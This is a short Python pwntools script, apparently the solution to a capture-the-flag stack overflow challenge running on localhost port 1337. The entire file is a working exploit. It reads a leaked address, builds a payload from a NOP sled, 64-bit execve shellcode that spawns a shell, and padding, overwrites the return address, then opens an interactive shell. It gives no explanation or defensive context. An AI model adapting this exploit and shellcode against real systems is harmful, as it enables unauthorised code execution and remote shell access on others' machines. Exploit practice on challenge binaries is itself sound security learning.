from pwn import *

# Lokal
# l = process('./challenge')

# Remote server
l = remote('localhost', 1337)

nop = b"\x90" * 12

#27 byte shellcode (64-bit)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

address = l.recvline() 
address = address.strip()
log.info(f"Got address: {address}")

rip = p64(int(address, 16))

exploit = b""
exploit += nop
exploit += shellcode
exploit += b"A" * (120 - len(exploit))
exploit += rip

l.sendline("test")
l.recvline()

#Send exploit
l.sendline(exploit)
l.interactive()




